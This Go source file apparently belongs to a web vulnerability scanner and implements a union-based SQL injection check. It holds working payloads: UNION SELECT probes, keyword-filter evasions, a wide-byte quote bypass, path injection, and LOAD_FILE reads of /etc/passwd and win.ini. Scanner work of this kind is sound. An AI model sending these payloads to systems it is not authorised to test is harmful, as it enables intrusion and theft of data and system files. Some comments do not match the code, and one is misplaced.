package active

import (
	"context"
	"fmt"
	"html"
	"net/url"
	"regexp"
	"strconv"
	"strings"

	"github.com/guaidao2/crackweb/internal/checks"
	"github.com/guaidao2/crackweb/internal/diff"
	"github.com/guaidao2/crackweb/internal/finding"
	"github.com/guaidao2/crackweb/internal/httpmsg"
	"github.com/guaidao2/crackweb/internal/i18n"
	"github.com/guaidao2/crackweb/internal/payload"
)

// unionMarkerBase starts a run of numbers used as column values. They are large
// and consecutive so that finding one in a page is not an accident, and so that
// how many of them were echoed says how many columns were visible.
const unionMarkerBase = 918273645

// unionMarkerRe recognises any of the marker numbers, in a form that survives
// the mutators: a keyword-splitting or case-swapping rewrite changes the SQL
// around the numbers but not the numbers themselves.
var unionMarkerRe = regexp.MustCompile(`9182736[0-9]{2}`)

// maxUnionColumns bounds the search. Beyond a dozen columns the guesswork costs
// more requests than the finding is worth, and real result sets that wide are
// usually reached a different way.
const maxUnionColumns = 12

// unionStability is how alike two back-to-back requests must be before their
// answers can be compared.
const unionStability = 0.98

// unionColumnProbe asks the database how wide the result set is.
//
// A UNION whose arms disagree on width is a syntax error in every database, which is what makes
// the count discoverable rather than guessable: `ORDER BY n` is accepted for every n up to the
// width and refused at width+1. Doubling to find the ceiling and then bisecting costs about
// 2*log2(width) requests and reaches widths no fixed bound would — a thirteen-column result set
// is ordinary, and the seeds alone stop at maxUnionColumns.
//
// Returns 0 when the boundary cannot be established, which leaves the caller to walk the seeds
// as before.
func unionColumnProbe(ctx context.Context, c *checks.Context, t *checks.Target) int {
	accepted := func(n int) bool {
		// Percent-encoded: a query string carrying a bare quote and space is refused by the
		// transport before the database ever sees it, which reads as "the column is not
		// there" and would make every count look like zero.
		_, response, err := c.InjectEncoded(ctx, t,
			t.Param.Value+"' ORDER BY "+strconv.Itoa(n)+"-- -", checks.EncodeURL)
		if err != nil || response == nil || response.Status >= 400 {
			return false
		}
		// A refused column is usually a 500, but a target that answers errors with 200 is
		// just as common; the database's complaint quotes the number it choked on.
		return firstNewSignature(strings.ToLower(string(response.Body)),
			strings.ToLower(string(t.Response.Body)), sqlErrorSignatures) == ""
	}

	if !accepted(1) {
		return 0
	}
	low := 1
	high := 2
	for high <= unionProbeCeiling && accepted(high) {
		low = high
		high *= 2
	}
	if high > unionProbeCeiling {
		return 0
	}
	// The boundary sits between low (accepted) and high (refused).
	for low+1 < high {
		mid := (low + high) / 2
		if accepted(mid) {
			low = mid
		} else {
			high = mid
		}
	}
	return low
}

// unionProbeCeiling bounds the doubling search. Wider than any result set worth filling with
// markers.
const unionProbeCeiling = 64

// unionSeeds builds one payload per candidate column count.
//
// The column count has to be discovered because it cannot be guessed: a UNION
// whose arms disagree on width is a syntax error in every database, so the
// scanner asks for one column, then two, and so on, until the page stops
// complaining. The seeds go through the mutation engine afterwards, so a
// keyword filter in front of the query is defeated the same way it is for any
// other payload.
func unionSeeds() []string {
	seeds := make([]string, 0, 2*maxUnionColumns)
	for columns := 1; columns <= maxUnionColumns; columns++ {
		values := make([]string, columns)
		for i := range values {
			values[i] = strconv.Itoa(unionMarkerBase + i)
		}
		list := strings.Join(values, ",")
		seeds = append(seeds,
			"1' UNION SELECT "+list+"-- -",
			// The same statement for a parameter interpolated as a number, where
			// the quote above is a syntax error rather than an escape. Both are
			// needed: the quoting context is a property of the application, not
			// something the payload can guess.
			"1 UNION SELECT "+list+"-- -",
			// A filter that removes a keyword once, rather than refusing the request,
			// turns this back into the statement above. It is a seed rather than only a
			// transformation because a transformation reaches one payload per generation,
			// and which column count fits is a property of the table, not of the payload.
			"1' UNUNIONION SELSELECTECT "+list+"-- -",
			// The same argument for the version comment: `UNION SELECT` becomes
			// `/*!50000UNION*/ /*!50000SELECT*/`, which a rule matching the two words together
			// no longer recognises, and the database still runs.
			"1' /*!50000UNION*/ /*!50000SELECT*/ "+list+"-- -",
		)
	}
	return seeds
}

// unionColumnsIn reports how many marker numbers a payload carries, which is the
// column count it was built for.
func unionColumnsIn(sent string) int {
	return len(unionMarkerRe.FindAllString(sent, -1))
}

// unionMarkersInText returns the markers a page rendered outside a tag.
//
// A marker inside a tag is the page putting the caller's value back into an
// attribute — a value, not a result — and everything else is counted. Deciding
// from the text alone whether an occurrence is an echo or a row is not reliable
// enough to try: a payload sent split to get past a filter (`UN/**/ION`) comes
// back with the same split, so a search for the keyword finds nothing and every
// echoed marker would count as a result.
//
// What separates the two reliably is the comparison against a page loaded with
// the bare marker, which is the probe the check runs before any payload. The
// earlier version segmented the document with a regex for "text between tags",
// and that cost real findings: a page that renders its rows into a `<script>`
// block — `JSON.parse('[…]').map(i => …)` — has `>` characters in the middle of
// the data, so no segment reached a marker and every row was invisible.
func unionMarkersInText(body string) []string {
	var found []string
	for _, loc := range unionMarkerRe.FindAllStringIndex(body, -1) {
		if insideTag(body[:loc[0]]) {
			continue
		}
		found = append(found, body[loc[0]:loc[1]])
	}
	return found
}

// insideTag reports whether a position is inside a tag — after its `<` and before
// its closing `>` — which is where an echoed attribute value sits.
func insideTag(before string) bool {
	return strings.LastIndex(before, "<") > strings.LastIndex(before, ">")
}

// unionMarkersLanded reports whether the page rendered a marker the query
// returned, rather than one the page echoed back.
func unionMarkersLanded(body, sent string) bool {
	return len(unionMarkersInText(stripPayloadEcho(body, sent))) > 0
}

// unionMarkersExceedEcho reports whether the injected values outnumber the echo.
//
// The probe asked for one marker and counted how many times this page repeats it, so that count
// is per marker: a payload carrying n markers comes back n times as many when it is only being
// echoed. Comparing the total against `echoed*n` looks equivalent and is not — the removal of
// the echo is not complete (a wide-byte payload comes back with U+FFFD where the byte was, which
// the removal does not reach, and a JSON body carries the same values in several fields), so the
// total sits somewhere between "the echo" and "the echo plus the rows". What survives both is
// per marker: each one has to appear more often than the page repeats a marker on its own.
func unionMarkersExceedEcho(body string, echoed int) bool {
	markers := unionMarkersInText(body)
	if len(markers) == 0 {
		return false
	}
	counts := map[string]int{}
	for _, marker := range markers {
		counts[marker]++
	}
	for _, marker := range counts {
		if marker > echoed {
			return true
		}
	}
	return false
}

// unionEchoed asks the page how many times it repeats a bare marker.
//
// Removing the payload that was sent takes off the echo that carries the whole
// statement, but a search page also prints the term in prose — a heading, a
// "nothing found for …" line — and those are text rather than attributes, so the
// removal does not reach them and the marker count comes back non-zero on a page
// that injected nothing. Asking for the marker on its own, with no SQL at all,
// measures exactly that residue. Returns -1 when the probe could not be made, so
// that the caller can fall back to what it knew before.
func unionEchoed(ctx context.Context, c *checks.Context, t *checks.Target) int {
	_, response, err := c.InjectEncoded(ctx, t, fmt.Sprintf("%d", unionMarkerBase), checks.EncodeNone)
	if err != nil || response == nil || response.Status >= 400 {
		return -1
	}
	return len(unionMarkersInText(string(response.Body)))
}

// stripPayloadEcho removes the payload that was sent from a response, in each of
// the forms the value can come back in: as it was sent, HTML-escaped, and
// URL-encoded. A page that prints its input prints it as one of those, so what is
// left after the removal is what the query added.
func stripPayloadEcho(body, sent string) string {
	if sent == "" {
		return body
	}
	// The forms the value can come back in. A payload the engine encoded goes out in that
	// encoded shape and arrives wherever it is echoed in the decoded one — the application sees
	// what the transport delivered, not what was written on the wire. Removing only the form
	// that was sent leaves the marker behind, and the page that merely repeated the input reads
	// as a page whose query returned it. This is the same mistake the wide-byte path had, in the
	// place that fixes it for everybody.
	forms := []string{sent, html.EscapeString(sent), url.QueryEscape(sent)}
	if decoded := percentDecoded(sent); decoded != sent {
		forms = append(forms, decoded, html.EscapeString(decoded), url.QueryEscape(decoded))
		// A server that re-encodes what it echoes replaces a byte that is not valid UTF-8 with the
		// replacement character, so what comes back is not the decoded payload but a normalised
		// version of it. Both spellings have to come off, or the marker survives the removal.
		if normalised := strings.ToValidUTF8(decoded, "\uFFFD"); normalised != decoded {
			forms = append(forms, normalised, html.EscapeString(normalised),
				url.QueryEscape(normalised))
		}
	}
	out := body
	for _, form := range forms {
		if form != "" {
			out = strings.ReplaceAll(out, form, "")
		}
	}
	return out
}

// sqliUnion detects SQL injection by extending the query's result set.
//
// It exists because the other three SQL checks each need something a hardened
// target may withhold: an error message, a response that tracks a boolean, or
// enough time to notice. A page that simply prints the rows it was given gives
// away nothing to any of them, and everything to this one.
type sqliUnion struct{}

func (sqliUnion) ID() string                 { return "sqli-union" }
func (sqliUnion) TitleKey() i18n.Key         { return i18n.KeyCheckSQLiUnionTitle }
func (sqliUnion) DescriptionKey() i18n.Key   { return i18n.KeyCheckSQLiUnionDesc }
func (sqliUnion) RemediationKey() i18n.Key   { return i18n.KeyCheckSQLiUnionFix }
func (sqliUnion) Severity() finding.Severity { return finding.SeverityCritical }
func (sqliUnion) Tags() []string {
	return []string{"active", "injection", "sqli", "owasp-top10"}
}
func (sqliUnion) Passive() bool { return false }

// unionFileReadPaths are the files worth asking a database to hand over. One names the
// account database on a Unix host, the other a Windows file that exists on every install.
var unionFileReadPaths = []string{"/etc/passwd", "C:\\windows\\win.ini"}

// unionFileReadSignatures are lines only those files carry. They are lower case because the
// comparison lower-cases the body, and each is a string a page has no other reason to hold.
var unionFileReadSignatures = []string{
	"root:x:0:0",
	"daemon:x:1:1",
	"nobody:x:65534",
	"[boot loader]",
	"for 16-bit app support",
}

// unionFileRead reports an injection that read a file through the database's own privileges.
//
// It is the union technique pointed at the filesystem: the database process usually runs with
// enough access to read its configuration and the account database beside it, so an injection
// that can add a SELECT can also return a file. The proof is a line of that file rather than a
// marker this check planted — nothing was planted, the target produced it — which is why it is
// reported on its own rather than as another spelling of the marker test.
// unionWideByte asks for rows with a payload that is already in the encoding it has to arrive
// in, because the trick is a byte sequence rather than a spelling: `%df%27` is what leaves a
// quote in the query when the connection's character set folds the trailing backslash of an
// escaping function into a double-byte character. Encoded a second time it is literal text and
// closes nothing, which is why these go out as written — the same reason the boolean wide-byte
// families pass EncodeNone.
//
// It runs only after every ordinary spelling has failed, so a target that accepts one pays
// nothing for it, and it walks the column counts for the same reason the seeds do: which count
// fits is a property of the table.
func unionWideByte(ctx context.Context, c *checks.Context, t *checks.Target,
	baseline *httpmsg.Response, baselineLower string) *finding.Finding {
	for columns := 1; columns <= maxUnionColumns; columns++ {
		markers := make([]string, 0, columns)
		for i := 0; i < columns; i++ {
			markers = append(markers, fmt.Sprintf("%d", unionMarkerBase+i))
		}
		// `+` for the spaces and `%2C` for the separators: the payload is sent verbatim.
		payloadText := "1%df%27+UNION+SELECT+" + strings.Join(markers, "%2C") + "--+-"
		request, response, err := c.InjectEncoded(ctx, t, payloadText, checks.EncodeNone)
		if err != nil || request == nil || response == nil || response.Status >= 400 {
			continue
		}
		if firstNewSignature(strings.ToLower(string(response.Body)), baselineLower,
			sqlErrorSignatures) != "" {
			continue
		}
		// The page echoes what it was given, and what it was given is not what was sent: the
		// server decoded the escapes before the application saw them, so a reflection carries
		// the decoded form while the request carries the encoded one. Both have to come off
		// before the markers that remain mean anything — otherwise a page that simply repeats
		// its input looks like a page that gained rows.
		echoed := payloadText
		if decoded, err := url.QueryUnescape(payloadText); err == nil {
			echoed = decoded
		}
		withoutEcho := stripPayloadEcho(string(response.Body), payloadText)
		if echoed != payloadText {
			withoutEcho = stripPayloadEcho(withoutEcho, echoed)
		}
		if !unionMarkersLanded(withoutEcho, echoed) {
			continue
		}
		// The same control the ordinary spelling uses. A page that prints the term it was given
		// shows the markers whether or not the statement ran, and the wide-byte spelling is the
		// one that reaches a page whose output is JSON: the value comes back inside the echo
		// field, with the byte that made the quote visible replaced by U+FFFD, which the removal
		// above does not reach. Measuring what the page repeats on its own is what separates the
		// two, and a page whose response is a struct scan dropping every UNION row — `"users":null`
		// — would otherwise be reported as having returned them as data.
		if echoed := unionEchoed(ctx, c, t); echoed >= 0 && !unionMarkersExceedEcho(string(response.Body), echoed) {
			continue
		}

		landed := unionMarkersInText(withoutEcho)
		f := checks.NewFinding(sqliUnion{}, t,
			i18n.KeyCheckSQLiUnionTitle, i18n.KeyCheckSQLiUnionDesc, i18n.KeyCheckSQLiUnionFix)
		f.Severity = finding.SeverityCritical
		f.Confidence = finding.ConfidenceFirm
		f.Payload = payloadText
		f.CWE = "CWE-89"
		f.References = sqlReferences
		f.Evidence.Request = request.Raw()
		f.Evidence.Response = truncate(response.Body, 8192)
		f.Evidence.Baseline = truncate(baseline.Body, 4096)
		f.Evidence.Matches = []string{
			fmt.Sprintf("a %d-column UNION SELECT was accepted", columns),
			fmt.Sprintf("%d injected value(s) appeared in the page as data: %s",
				len(landed), strings.Join(landed, " ")),
			"the quote survived an escaping function that adds a backslash: the connection's " +
				"character set folds that backslash into the preceding byte, leaving the quote",
		}
		f.Evidence.Diff = extractAround(string(response.Body), fmt.Sprintf("%d", unionMarkerBase), 240)
		return f
	}
	return nil
}

// unionPathInjection asks for rows through the path instead of a parameter.
//
// A route that reads `/user/<name>` has a value the caller writes, and a union payload works
// there exactly as it does in a query parameter — the difference is only where it is written.
// The payload is appended to the segment that is already there, because the route is expecting
// a value in that position and a segment that replaced it would name a different resource.
//
// The judgement needs one thing the error-based probe does not: a reference for what this route
// does when the value simply is not there. A page for a missing resource is served normally and
// may well echo the segment it was asked for, so "the marker appeared" has to be read against
// the response for a segment nothing is stored under — otherwise a page quoting its own path
// counts as a query that returned rows.
func unionPathInjection(ctx context.Context, c *checks.Context, t *checks.Target,
	baseline *httpmsg.Response) *finding.Finding {
	segment := pathSegment(t.Request)
	if segment == "" {
		return nil
	}

	// What this route answers when the value names nothing.
	missingRequest, ok := withPathPayload(t.Request, "crackweb-absent-"+overrideSuffix(), true)
	if !ok {
		return nil
	}
	missing, err := c.Do(ctx, missingRequest)
	if err != nil || missing == nil {
		return nil
	}
	missingFingerprint := c.Fingerprint(missing)

	for columns := 1; columns <= unionPathColumns; columns++ {
		markers := make([]string, 0, columns)
		for i := 0; i < columns; i++ {
			markers = append(markers, fmt.Sprintf("%d", unionMarkerBase+i))
		}
		payloadText := segment + "' UNION SELECT " + strings.Join(markers, ",") + "-- -"
		request, ok := withPathPayload(t.Request, payloadText, true)
		if !ok {
			continue
		}
		response, err := c.Do(ctx, request)
		if err != nil || response == nil || response.Status >= 400 {
			continue
		}
		if !unionMarkersLanded(string(response.Body), payloadText) {
			continue
		}
		// The marker has to be something the route produced rather than something it echoed.
		if diff.CompareFingerprints(missingFingerprint, c.Fingerprint(response)).Score >= uploadSimilarity {
			continue
		}

		landed := unionMarkersInText(stripPayloadEcho(string(response.Body), payloadText))
		f := checks.NewFinding(sqliUnion{}, t,
			i18n.KeyCheckSQLiUnionTitle, i18n.KeyCheckSQLiUnionDesc, i18n.KeyCheckSQLiUnionFix)
		f.Severity = finding.SeverityCritical
		f.Confidence = finding.ConfidenceFirm
		f.Payload = payloadText
		f.CWE = "CWE-89"
		f.References = sqlReferences
		f.Evidence.Request = request.Raw()
		f.Evidence.Response = truncate(response.Body, 8192)
		f.Evidence.Baseline = truncate(baseline.Body, 4096)
		f.Evidence.Matches = []string{
			fmt.Sprintf("a %d-column UNION SELECT was accepted through the path", columns),
			fmt.Sprintf("%d injected value(s) appeared in the page as data: %s",
				len(landed), strings.Join(landed, " ")),
			"the payload was written into the path, with no parameter changed, and a segment " +
				"naming nothing answers differently",
		}
		f.Evidence.Diff = extractAround(string(response.Body), fmt.Sprintf("%d", unionMarkerBase), 240)
		return f
	}
	return nil
}

// unionPathColumns bounds the column counts tried through the path. It is smaller than the
// parameter walk because each count costs a request on a route that is usually the same shape,
// and a table wide enough to need more than this is rare next to the cost of asking.
const unionPathColumns = 3

// pathSegment returns the last segment of the request's path, which is where a route puts the
// value it addresses a resource by.
func pathSegment(request *httpmsg.Request) string {
	if request == nil || request.URL == nil {
		return ""
	}
	trimmed := strings.TrimSuffix(request.URL.Path, "/")
	if trimmed == "" {
		return ""
	}
	segments := strings.Split(trimmed, "/")
	return segments[len(segments)-1]
}

func unionFileRead(ctx context.Context, c *checks.Context, t *checks.Target) *finding.Finding {
	baseline := strings.ToLower(string(t.Response.Body))
	for _, path := range unionFileReadPaths {
		for columns := 1; columns <= 9; columns++ {
			selects := make([]string, 0, columns)
			for i := 0; i < columns-1; i++ {
				selects = append(selects, strconv.Itoa(i+1))
			}
			selects = append(selects, "LOAD_FILE('"+path+"')")
			payload := "1' UNION SELECT " + strings.Join(selects, ",") + "-- -"

			mutated, response, err := c.Inject(ctx, t, payload)
			if err != nil || response == nil || response.Status >= 400 {
				continue
			}
			body := strings.ToLower(string(response.Body))
			for _, signature := range unionFileReadSignatures {
				if !strings.Contains(body, signature) || strings.Contains(baseline, signature) {
					continue
				}

				f := checks.NewFinding(sqliUnion{}, t,
					i18n.KeyCheckSQLiUnionTitle, i18n.KeyCheckSQLiUnionDesc, i18n.KeyCheckSQLiUnionFix)
				f.Severity = finding.SeverityCritical
				// Certain: the file's own contents came back, which nothing but a read of
				// that file produces.
				f.Confidence = finding.ConfidenceCertain
				f.Payload = payload
				f.CWE = "CWE-89"
				f.References = sqlReferences
				f.Evidence.Request = mutated.Raw()
				f.Evidence.Response = truncate(response.Body, 8192)
				f.Evidence.Baseline = truncate(t.Response.Body, 4096)
				f.Evidence.Matches = []string{
					"the injection read " + path + " through the database and returned it (" +
						signature + ")",
					"the database process can read files, so an injection that can add a SELECT " +
						"can also read the filesystem",
				}
				f.Evidence.Diff = extractAround(string(response.Body), signature, 240)
				return f
			}
		}
	}
	return nil
}
func (sqliUnion) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t == nil || t.Param == nil || t.Response == nil {
		return nil
	}

	// The judgement is "the page gained numbers", so the page has to be steady
	// enough for that to mean anything.
	baseline := c.StableBaseline(ctx, t.Request, unionStability)
	if baseline == nil {
		return nil
	}
	// A page that already contains the marker cannot be used to detect it.
	if unionMarkerRe.MatchString(string(baseline.Body)) {
		return nil
	}

	c.ProbeWAF(ctx, t)

	// A page that echoes the term back renders the marker whether or not anything
	// was injected — a search form puts it in its own field and often in a "no
	// results for …" heading as well. The judge therefore removes the payload it
	// sent from the response before counting anything, in each of the forms the
	// value can come back in (verbatim, HTML-escaped, URL-encoded). What survives
	// that removal is what the query added.
	//
	// This is done by the judge rather than by a probe, because only the judge
	// knows the exact string that was sent — and that string is the one thing an
	// echo is guaranteed to contain. A probe that asked for the bare marker could
	// only compare counts, and a payload carrying two markers against a probe
	// carrying one reads as "one row arrived" even on a page that injected
	// nothing.
	baselineLower := strings.ToLower(string(baseline.Body))
	seeds := unionSeeds()
	// A result set can be wider than the seeds walk, and the width is discoverable: ask for it
	// directly rather than guessing upward. The answer goes in front, so a target that is only
	// injectable at that width is found without walking the rest first.
	if width := unionColumnProbe(ctx, c, t); width > 0 {
		values := make([]string, width)
		for i := range values {
			values[i] = strconv.Itoa(unionMarkerBase + i)
		}
		seeds = append([]string{"1' UNION SELECT " + strings.Join(values, ",") + "-- -"}, seeds...)
	}
	attempt, err := c.SendVariants(ctx, t, payload.SQLi, "sqli-union", seeds,
		func(_ *httpmsg.Request, resp *httpmsg.Response, variant payload.Variant) bool {
			// A query that failed is not a query that returned rows. The database's own
			// complaint quotes the bytes it choked on, and those bytes include the marker —
			// counting them as a row is how an error response passes for a successful
			// injection. A target that refuses the request is not refused here: it is
			// simply not evidence of acceptance.
			if firstNewSignature(strings.ToLower(string(resp.Body)), baselineLower,
				sqlErrorSignatures) != "" {
				return false
			}
			return unionMarkersLanded(string(resp.Body), variant.Value)
		})
	if err != nil || attempt == nil {
		// Nothing came back as a row from a payload written the ordinary way. Two things can
		// still work, and neither is a spelling of the statement: the quote can be escaped by
		// the connection's character set rather than by the payload, and the rows can come from
		// a file instead of a table.
		if f := unionWideByte(ctx, c, t, baseline, baselineLower); f != nil {
			return []*finding.Finding{f}
		}
		if f := unionPathInjection(ctx, c, t, baseline); f != nil {
			return []*finding.Finding{f}
		}
		if f := unionFileRead(ctx, c, t); f != nil {
			return []*finding.Finding{f}
		}
		return nil
	}

	columns := unionColumnsIn(attempt.Variant.Value)
	// The same function that accepted the evidence reports it, so the count in
	// the finding is the count that was judged rather than a broader one.
	landed := unionMarkersInText(stripPayloadEcho(string(attempt.Response.Body), attempt.Variant.Value))

	// What the page prints of its own accord has to come off the count. The removal above takes
	// off the echo that carries the whole statement; a search page also repeats the term in
	// prose, outside any tag, and those survive it. The probe asked for the bare marker, so its
	// count is per marker — a payload carrying n markers lands n times as many when it is only
	// being echoed, which is why the comparison is against the count scaled by n.
	if echoed := unionEchoed(ctx, c, t); echoed >= 0 && !unionMarkersExceedEcho(string(attempt.Response.Body), echoed) {
		return nil
	}

	f := checks.NewFinding(sqliUnion{}, t,
		i18n.KeyCheckSQLiUnionTitle, i18n.KeyCheckSQLiUnionDesc, i18n.KeyCheckSQLiUnionFix)
	f.Severity = finding.SeverityCritical
	// Firm, not certain: the rows are demonstrably caller-controlled, but a page
	// could in principle be replaying a stored value rather than a fresh query.
	f.Confidence = finding.ConfidenceFirm
	f.Payload = attempt.Variant.Value
	f.CWE = "CWE-89"
	f.References = sqlReferences
	f.Evidence.Request = attempt.Request.Raw()
	f.Evidence.Response = truncate(attempt.Response.Body, 8192)
	f.Evidence.Baseline = truncate(baseline.Body, 4096)
	f.Evidence.Matches = []string{
		fmt.Sprintf("a %d-column UNION SELECT was accepted", columns),
		fmt.Sprintf("%d injected value(s) appeared in the page as data: %s",
			len(landed), strings.Join(landed, " ")),
		variantNote(c, attempt),
	}
	f.Evidence.Diff = extractAround(string(attempt.Response.Body), fmt.Sprintf("%d", unionMarkerBase), 240)
	return []*finding.Finding{f}
}

// percentDecoded returns the bytes a percent-encoded string stands for.
//
// It does the work of `url.QueryUnescape` without the UTF-8 check that function performs. A
// payload may legitimately carry a byte that is not valid UTF-8 — the wide-byte quote is exactly
// that — and a decoder that refuses it also refuses the echo form the page printed, leaving the
// marker in place and the page reading as though its query returned it.
func percentDecoded(s string) string {
	var b strings.Builder
	b.Grow(len(s))
	for i := 0; i < len(s); i++ {
		switch {
		case s[i] == '+':
			b.WriteByte(' ')
		case s[i] == '%' && i+2 < len(s):
			hi, ok1 := hexDigit(s[i+1])
			lo, ok2 := hexDigit(s[i+2])
			if !ok1 || !ok2 {
				b.WriteByte(s[i])
				continue
			}
			b.WriteByte(hi<<4 | lo)
			i += 2
		default:
			b.WriteByte(s[i])
		}
	}
	return b.String()
}

// hexDigit returns the value of a hexadecimal digit.
func hexDigit(c byte) (byte, bool) {
	switch {
	case c >= '0' && c <= '9':
		return c - '0', true
	case c >= 'a' && c <= 'f':
		return c - 'a' + 10, true
	case c >= 'A' && c <= 'F':
		return c - 'A' + 10, true
	}
	return 0, false
}
